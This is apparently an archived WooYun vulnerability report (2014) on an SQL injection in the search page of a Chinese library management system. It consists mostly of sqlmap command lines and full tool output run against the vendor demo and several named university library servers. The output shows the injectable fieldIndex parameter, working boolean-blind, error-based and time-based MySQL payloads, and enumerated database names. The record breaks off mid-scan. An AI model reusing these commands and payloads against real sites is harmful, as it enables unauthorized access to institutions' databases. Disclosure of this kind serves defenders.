{"id": 43834, "wybug_id": "wooyun-2014-081506", "wybug_title": "某图书管理系统sql注入漏洞（官方demo测试）", "wybug_corp": "南京昂克软件有限公司", "wybug_author": "路人甲", "wybug_date": "2014-11-04 10:43", "wybug_open_date": "2015-02-02 10:44", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-04：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-02：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  南京昂克软件有限公司http://www.angke.com.cn/ http://demo.angke.com.cn/    漏洞证明：  案例：官方demo 注入点 http://demo.angke.com.cn/search/doSearch.html?typeIndex=&fieldIndex=z_class&keywordFir=TP391.41%2F3988 [root@Hacker~]# Sqlmap -u \"http://demo.angke.com.cn/search/doSearch.html?typeInd ex=&fieldIndex=z_class&keywordFir=TP391.41%2F3988\" -p fieldIndex fieldIndex 参数过滤不严\n\n\n\n嘉兴学院图书馆wlib.zjxu.edu.cn\n[root@Hacker~]# Sqlmap -u \"http://wlib.zjxu.edu.cn/search/doSearch.html?typeIndex=&fieldIndex=1&keywordFir=Altium+Designer+13%E4%B8%AD%E6%96%87%E7%89%88%E6%A0%87%E5%87%86%E5%AE%9E%E4%BE%8B%E6%95%99%E7%A8%8B.2%E7%89%88\" -p fieldIndex --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 10:00:21[10:00:21] [INFO] resuming back-end DBMS 'mysql'[10:00:21] [INFO] testing connection to the target url[10:00:21] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: fieldIndex    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: typeIndex=&fieldIndex=1) AND (SELECT 3157 FROM(SELECT COUNT(*),CONCAT(0x3a7969733a,(SELECT (CASE WHEN (3157=3157) THEN 1 ELSE 0 END)),0x3a6a79643a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (3669=3669&keywordFir=Altium Designer 13?????????.2?---[10:00:21] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.2.17back-end DBMS: MySQL 5.0[10:00:21] [INFO] fetching database names[10:00:22] [WARNING] reflective value(s) found and filtering out[10:00:22] [INFO] the SQL query used returns 3 entries[10:00:22] [INFO] retrieved: information_schema[10:00:22] [INFO] retrieved: mysql[10:00:23] [INFO] retrieved: nrmsavailable databases [3]:[*] information_schema[*] mysql[*] nrms[10:00:23] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 4 times[10:00:23] [INFO] fetched data logged to text files under 'F:\\????\\SQLmap\\Bin\\output\\wlib.zjxu.edu.cn'[*] shutting down at 10:00:23[root@Hacker~]# Sqlmap\n新疆大学图书馆218.195.234.48\n[root@Hacker~]# Sqlmap -u \"http://218.195.234.48//search/doSearch.html?typeIndex=&fieldIndex=1&keywordFir=Altium+Designer+13%E4%B8%AD%E6%96%87%E7%89%88%E6%A0%87%E5%87%86%E5%AE%9E%E4%BE%8B%E6%95%99%E7%A8%8B.2%E7%89%88\"    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 10:15:46[10:15:47] [INFO] testing connection to the target URL[10:15:47] [INFO] testing if the target URL is stable. This can take a couple of seconds[10:15:48] [INFO] target URL is stable[10:15:48] [INFO] testing if GET parameter 'typeIndex' is dynamic[10:15:49] [INFO] confirming that GET parameter 'typeIndex' is dynamic[10:15:49] [WARNING] GET parameter 'typeIndex' does not appear dynamic[10:15:49] [INFO] testing for SQL injection on GET parameter 'typeIndex'[10:15:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[10:15:52] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[10:15:53] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[10:15:55] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[10:15:57] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[10:15:58] [INFO] testing 'MySQL inline queries'[10:15:58] [INFO] testing 'PostgreSQL inline queries'[10:15:59] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[10:15:59] [INFO] testing 'Oracle inline queries'[10:15:59] [INFO] testing 'SQLite inline queries'[10:16:00] [INFO] testing 'MySQL > 5.0.11 stacked queries'[10:16:02] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[10:16:03] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[10:16:05] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[10:16:07] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[10:16:09] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[10:16:10] [INFO] testing 'Oracle AND time-based blind'[10:16:11] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[10:16:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[10:16:29] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it using option '--dbms'[10:16:48] [WARNING] GET parameter 'typeIndex' is not injectable[10:16:48] [INFO] testing if GET parameter 'fieldIndex' is dynamic[10:16:48] [WARNING] GET parameter 'fieldIndex' does not appear dynamic[10:16:49] [INFO] heuristic (basic) test shows that GET parameter 'fieldIndex' might be injectable (possible DBMS: 'MySQL')[10:16:49] [INFO] testing for SQL injection on GET parameter 'fieldIndex'heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do youwant to skip test payloads specific for other DBMSes? [Y/n] ydo you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] y[10:18:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[10:18:16] [WARNING] reflective value(s) found and filtering out[10:18:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'[10:18:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'[10:18:27] [INFO] testing 'MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)'[10:18:28] [INFO] GET parameter 'fieldIndex' is 'MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)' injectable[10:18:28] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[10:18:28] [INFO] GET parameter 'fieldIndex' is 'MySQL >= 5.0 AND error-based -WHERE or HAVING clause' injectable[10:18:28] [INFO] testing 'MySQL inline queries'[10:18:28] [INFO] testing 'MySQL > 5.0.11 stacked queries'[10:18:28] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'[10:18:29] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[10:18:29] [INFO] testing 'MySQL > 5.0.11 AND time-based blind (comment)'[10:18:29] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'[10:19:06] [INFO] GET parameter 'fieldIndex' is 'MySQL < 5.0.12 AND time-based blind (heavy query)' injectable[10:19:06] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[10:19:06] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[10:19:14] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'[10:19:20] [INFO] testing 'MySQL UNION query (NULL) - 22 to 40 columns'[10:19:27] [INFO] testing 'MySQL UNION query (random number) - 22 to 40 columns'[10:19:34] [INFO] testing 'MySQL UNION query (NULL) - 42 to 60 columns'[10:19:41] [INFO] testing 'MySQL UNION query (random number) - 42 to 60 columns'[10:19:47] [INFO] testing 'MySQL UNION query (NULL) - 62 to 80 columns'[10:19:54] [INFO] testing 'MySQL UNION query (random number) - 62 to 80 columns'[10:20:01] [INFO] testing 'MySQL UNION query (NULL) - 82 to 100 columns'[10:20:08] [INFO] testing 'MySQL UNION query (random number) - 82 to 100 columns'[10:20:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'GET parameter 'fieldIndex' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y[10:21:07] [INFO] testing if GET parameter 'keywordFir' is dynamic[10:21:08] [INFO] confirming that GET parameter 'keywordFir' is dynamic[10:21:08] [INFO] GET parameter 'keywordFir' is dynamic[10:21:09] [WARNING] heuristic (basic) test shows that GET parameter 'keywordFir' might not be injectable[10:21:09] [INFO] testing for SQL injection on GET parameter 'keywordFir'[10:21:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[10:21:13] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'[10:21:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'[10:21:21] [INFO] testing 'MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)'[10:21:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'[10:21:25] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT -original value)'[10:21:26] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'[10:21:27] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace(original value)'[10:21:27] [INFO] testing 'MySQL < 5.0 boolean-based blind - Parameter replace (original value)'[10:21:28] [INFO] testing 'MySQL >= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses'[10:21:28] [INFO] testing 'MySQL < 5.0 boolean-based blind - GROUP BY and ORDERBY clauses'[10:21:30] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[10:21:32] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)'[10:21:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE or HAVING clause (UPDATEXML)'[10:21:35] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause'[10:21:36] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause'[10:21:38] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE or HAVING clause(EXTRACTVALUE)'[10:21:40] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE or HAVING clause(UPDATEXML)'[10:21:42] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause'[10:21:43] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause'[10:21:48] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'[10:21:49] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'[10:21:49] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'[10:21:49] [INFO] testing 'MySQL >= 5.0 error-based - GROUP BY and ORDER BY clauses'[10:21:50] [INFO] testing 'MySQL >= 5.1 error-based - GROUP BY and ORDER BY clauses (EXTRACTVALUE)'[10:21:50] [INFO] testing 'MySQL >= 5.1 error-based - GROUP BY and ORDER BY clauses (UPDATEXML)'[10:21:51] [INFO] testing 'MySQL inline queries'[10:21:51] [INFO] testing 'MySQL > 5.0.11 stacked queries'[10:21:53] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'[10:21:54] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[10:21:56] [INFO] testing 'MySQL > 5.0.11 AND time-based blind (comment)'[10:21:58] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'[10:21:59] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query - comment)'[10:22:01] [INFO] testing 'MySQL > 5.0.11 OR time-based blind'[10:22:03] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query)'[10:22:05] [INFO] testing 'MySQL >= 5.0 time-based blind - Parameter replace'[10:22:05] [INFO] testing 'MySQL < 5.0 time-based blind - Parameter replace (heavy queries)'[10:22:05] [INFO] testing 'MySQL time-based blind - Parameter replace (bool*int)'[10:22:05] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'[10:22:06] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'[10:22:06] [INFO] testing 'MySQL >= 5.0.11 time-based blind - GROUP BY and ORDER BY clauses'[10:22:07] [INFO] testing 'MySQL < 5.0.12 time-based blind - GROUP BY and ORDERBY clauses (heavy query)'[10:22:08] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[10:22:29] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'[10:22:49] [INFO] testing 'MySQL UNION query (NULL) - 11 to 20 columns'[10:23:09] [INFO] testing 'MySQL UNION query (random number) - 11 to 20 columns'[10:23:26] [INFO] testing 'MySQL UNION query (NULL) - 21 to 30 columns'[10:23:43] [INFO] testing 'MySQL UNION query (random number) - 21 to 30 columns'[10:24:01] [INFO] testing 'MySQL UNION query (NULL) - 31 to 40 columns'[10:24:19] [INFO] testing 'MySQL UNION query (random number) - 31 to 40 columns'[10:24:37] [INFO] testing 'MySQL UNION query (NULL) - 41 to 50 columns'[10:24:56] [INFO] testing 'MySQL UNION query (random number) - 41 to 50 columns'[10:25:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[10:25:32] [WARNING] GET parameter 'keywordFir' is not injectablesqlmap identified the following injection points with a total of 1165 HTTP(s) requests:---Place: GETParameter: fieldIndex    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: typeIndex=&fieldIndex=1) RLIKE IF(4996=4996,1,0x28) AND (5680=5680&keywordFir=Altium Designer 13%E4%B8%AD%E6%96%87%E7%89%88%E6%A0%87%E5%87%86%E5%AE%9E%E4%BE%8B%E6%95%99%E7%A8%8B.2%E7%89%88    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: typeIndex=&fieldIndex=1) AND (SELECT 7866 FROM(SELECT COUNT(*),CONCAT(0x7166647271,(SELECT (CASE WHEN (7866=7866) THEN 1 ELSE 0 END)),0x7166707371,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (8880=8880&keywordFir=Altium Designer 13%E4%B8%AD%E6%96%87%E7%89%88%E6%A0%87%E5%87%86%E5%AE%9E%E4%BE%8B%E6%95%99%E7%A8%8B.2%E7%89%88    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: typeIndex=&fieldIndex=1) AND 7379=BENCHMARK(5000000,MD5(0x61615376)) AND (9225=9225&keywordFir=Altium Designer 13%E4%B8%AD%E6%96%87%E7%89%88%E6%A0%87%E5%87%86%E5%AE%9E%E4%BE%8B%E6%95%99%E7%A8%8B.2%E7%89%88---[10:25:32] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.2.17back-end DBMS: MySQL 5.0[10:25:32] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 429 times[10:25:32] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[10:25:32] [INFO] fetched data logged to text files under 'E:\\SQL?~1\\SQLMAP~1.4\\Bin\\output\\218.195.234.48'[*] shutting down at 10:25:32[root@Hacker~]# Sqlmap\n长春财经学院218.62.46.131\n[root@Hacker~]# Sqlmap -u \"http://218.62.46.131/search/doSearch.html?typeIndex=&fieldIndex=1&keywordFir=Altium+Designer+13%E4%B8%AD%E6%96%87%E7%89%88%E6%A0%87%E5%87%86%E5%AE%9E%E4%BE%8B%E6%95%99%E7%A8%8B.2%E7%89%88\"    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 10:19:37[10:19:37] [INFO] testing connection to the target URL[10:19:37] [INFO] testing if the target URL is stable. This can take a couple of seconds[10:19:39] [INFO] target URL is stable[10:19:39] [INFO] testing if GET parameter 'typeIndex' is dynamic[10:19:40] [INFO] confirming that GET parameter 'typeIndex' is dynamic[10:19:40] [WARNING] GET parameter 'typeIndex' does not appear dynamic[10:19:40] [INFO] testing for SQL injection on GET parameter 'typeIndex'[10:19:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[10:19:42] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[10:19:43] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[10:19:44] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[10:19:45] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[10:19:47] [INFO] testing 'MySQL inline queries'[10:19:47] [INFO] testing 'PostgreSQL inline queries'[10:19:47] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'[10:19:47] [INFO] testing 'Oracle inline queries'[10:19:47] [INFO] testing 'SQLite inline queries'[10:19:48] [INFO] testing 'MySQL > 5.0.11 stacked queries'[10:19:50] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[10:19:51] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[10:19:52] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[10:19:53] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[10:19:54] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[10:19:56] [INFO] testing 'Oracle AND time-based blind'[10:19:57] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[10:20:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[10:20:12] [WARNING] using unescaped version of the test because of zero knowledge of the back-end DBMS. You can try to explicitly set it using option '--dbms'[10:20:30] [WARNING] GET parameter 'typeIndex' is not injectable[10:20:30] [INFO] testing if GET parameter 'fieldIndex' is dynamic[10:20:30] [WARNING] GET parameter 'fieldIndex' does not appear dynamic[10:20:30] [INFO] heuristic (basic) test shows that GET parameter 'fieldIndex' might be injectable (possible DBMS: 'MySQL')[10:20:30] [INFO] testing for SQL injection on GET parameter 'fieldIndex'heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do youwant to skip test payloads specific for other DBMSes? [Y/n] ydo you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] y[10:21:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[10:21:04] [WARNING] reflective value(s) found and filtering out[10:21:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'[10:21:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'[10:21:17] [INFO] testing 'MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)'[10:21:18] [INFO] GET parameter 'fieldIndex' is 'MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)' injectable[10:21:18] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[10:21:19] [INFO] GET parameter 'fieldIndex' is 'MySQL >= 5.0 AND error-based -WHERE or HAVING clause' injectable[10:21:19] [INFO] testing 'MySQL inline queries'[10:21:19] [INFO] testing 'MySQL > 5.0.11 stacked queries'[10:21:19] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'[10:21:19] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[10:21:19] [INFO] testing 'MySQL > 5.0.11 AND time-based blind (comment)'[10:21:19] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'[10:22:04] [INFO] GET parameter 'fieldIndex' is 'MySQL < 5.0.12 AND time-based blind (heavy query)' injectable[10:22:04] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'[10:22:04] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[10:22:10] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'[10:22:16] [INFO] testing 'MySQL UNION query (NULL) - 22 to 40 columns'[10:22:22] [INFO] testing 'MySQL UNION query (random number) - 22 to 40 columns'[10:22:26] [INFO] testing 'MySQL UNION query (NULL) - 42 to 60 columns'[10:22:33] [INFO] testing 'MySQL UNION query (random number) - 42 to 60 columns'[10:22:37] [INFO] testing 'MySQL UNION query (NULL) - 62 to 80 columns'[10:22:42] [INFO] testing 'MySQL UNION query (random number) - 62 to 80 columns'[10:22:48] [INFO] testing 'MySQL UNION query (NULL) - 82 to 100 columns'[10:22:53] [INFO] testing 'MySQL UNION query (random number) - 82 to 100 columns'[10:22:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'GET parameter 'fieldIndex' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y[10:23:45] [INFO] testing if GET parameter 'keywordFir' is dynamic[10:23:45] [INFO] confirming that GET parameter 'keywordFir' is dynamic[10:23:45] [INFO] GET parameter 'keywordFir' is dynamic[10:23:45] [WARNING] heuristic (basic) test shows that GET parameter 'keywordFir' might not be injectable[10:23:45] [INFO] testing for SQL injection on GET parameter 'keywordFir'[10:23:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[10:23:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'[10:23:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'[10:23:54] [INFO] testing 'MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)'[10:23:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'[10:23:57] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT -original value)'[10:23:58] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'[10:23:58] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace(original value)'[10:24:00] [INFO] testing 'MySQL < 5.0 boolean-based blind - Parameter replace (original value)'[10:24:01] [INFO] testing 'MySQL >= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses'[10:24:01] [INFO] testing 'MySQL < 5.0 boolean-based blind - GROUP BY and ORDERBY clauses'[10:24:01] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[10:24:02] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)'[10:24:04] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE or HAVING clause (UPDATEXML)'[10:24:05] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE or HAVING clause'[10:24:07] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause'[10:24:08] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE or HAVING clause(EXTRACTVALUE)'[10:24:11] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE or HAVING clause(UPDATEXML)'[10:24:12] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause'[10:24:13] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause'[10:24:15] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'[10:24:15] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'[10:24:15] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'[10:24:15] [INFO] testing 'MySQL >= 5.0 error-based - GROUP BY and ORDER BY clauses'[10:24:16] [INFO] testing 'MySQL >= 5.1 error-based - GROUP BY and ORDER BY clauses (EXTRACTVALUE)'[10:24:16] [INFO] testing 'MySQL >= 5.1 error-based - GROUP BY and ORDER BY clauses (UPDATEXML)'[10:24:16] [INFO] testing 'MySQL inline queries'[10:24:16] [INFO] testing 'MySQL > 5.0.11 stacked queries'[10:24:19] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'[10:24:21] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[10:24:23] [INFO] testing 'MySQL > 5.0.11 AND time-based blind (comment)'[10:24:29] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'[10:24:33] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query - comment)'[10:24:37] [INFO] testing 'MySQL > 5.0.11 OR time-based blind'[10:24:39] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query)'[10:24:44] [INFO] testing 'MySQL >= 5.0 time-based blind - Parameter replace'[10:24:44] [INFO] testing 'MySQL < 5.0 time-based blind - Parameter replace (heavy queries)'[10:24:45] [INFO] testing 'MySQL time-based blind - Parameter replace (bool*int)'[10:24:45] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'[10:24:45] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'[10:24:46] [INFO] testing 'MySQL >= 5.0.11 time-based blind - GROUP BY and ORDER BY clauses'[10:24:46] [INFO] testing 'MySQL < 5.0.12 time-based blind - GROUP BY and ORDERBY clauses (heavy query)'[10:24:47] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[10:25:06] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'[10:25:20] [INFO] testing 'MySQL UNION query (NULL) - 11 to 20 columns'[10:25:34] [INFO] testing 'MySQL UNION query (random number) - 11 to 20 columns'[10:25:48] [INFO] testing 'MySQL UNION query (NULL) - 21 to 30 columns'[10:26:02] [INFO] testing 'MySQL UNION query (random number) - 21 to 30 columns'[10:26:18] [INFO] testing 'MySQL UNION query (NULL) - 31 to 40 columns'[10:26:35] [INFO] testing 'MySQL UNION query (random number) - 31 to 40 columns'[10:26:48] [INFO] testing 'MySQL UNION query (NULL) - 41 to 50 columns'[10:27:07] [INFO] testing 'MySQL UNION query (random number) - 41 to 50 columns'[10:27:29] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[10:27:53] [WARNING] GET parameter 'keywordFir' is not injectablesqlmap identified the following injection points with a total of 1168 HTTP(s) requests:---Place: GETParameter: fieldIndex    Type: boolean-based blind    Title: MySQL boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (RLIKE)    Payload: typeIndex=&fieldIndex=1) RLIKE IF(8931=8931,1,0x28) AND (6273=6273&keywordFir=Altium Designer 13%E4%B8%AD%E6%96%87%E7%89%88%E6%A0%87%E5%87%86%E5%AE%9E%E4%BE%8B%E6%95%99%E7%A8%8B.2%E7%89%88    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: typeIndex=&fieldIndex=1) AND (SELECT 3813 FROM(SELECT COUNT(*),CONCAT(0x7165657271,(SELECT (CASE WHEN (3813=3813) THEN 1 ELSE 0 END)),0x716a6a7571,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (9450=9450&keywordFir=Altium Designer 13%E4%B8%AD%E6%96%87%E7%89%88%E6%A0%87%E5%87%86%E5%AE%9E%E4%BE%8B%E6%95%99%E7%A8%8B.2%E7%89%88    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: typeIndex=&fieldIndex=1) AND 2534=BENCHMARK(5000000,MD5(0x6f615174)) AND (6839=6839&keywordFir=Altium Designer 13%E4%B8%AD%E6%96%87%E7%89%88%E6%A0%87%E5%87%86%E5%AE%9E%E4%BE%8B%E6%95%99%E7%A8%8B.2%E7%89%88---[10:27:53] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.2.17back-end DBMS: MySQL 5.0[10:27:53] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 429 times[10:27:53] [WARNING] cannot properly display Unicode characters inside Windows OS command prompt (http://bugs.python.org/issue1602). All unhandled occurances will result in replacement with '?' character. Please, find proper character representation inside corresponding output files.[10:27:53] [INFO] fetched data logged to text files under 'E:\\SQL?~1\\SQLMAP~1.4\\Bin\\output\\218.62.46.131'[*] shutting down at 10:27:53[root@Hacker~]# Sqlmap\n南京工程学院图书馆 cd.lib.njit.edu.cn\n[root@Hacker~]# Sqlmap -u \"http://cd.lib.njit.edu.cn/search/doSearch.html?typeIndex=&fieldIndex=z_class&keywordFir=TP391.41%2F3988\"    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 10:44:09[10:44:09] [INFO] testing connection to the target URL[10:44:09] [INFO] testing if the target URL is stable. This can take a couple of seconds[10:44:11] [INFO] target URL is stable[10:44:11] [INFO] testing if GET parameter 'typeIndex' is dynamic[10:44:11] [INFO] confirming that GET parameter 'typeIndex' is dynamic[10:44:11] [WARNING] GET parameter 'typeIndex' does not appear dynamic[10:44:11] [WARNING] heuristic (basic) test shows that GET parameter 'typeIndex' might not be injectable[10:44:11] [INFO] testing for SQL injection on GET parameter 'typeIndex'[10:44:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[10:44:14] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[10:44:15] [INFO] testing 'PostgreSQL AND error-based - WHERE or 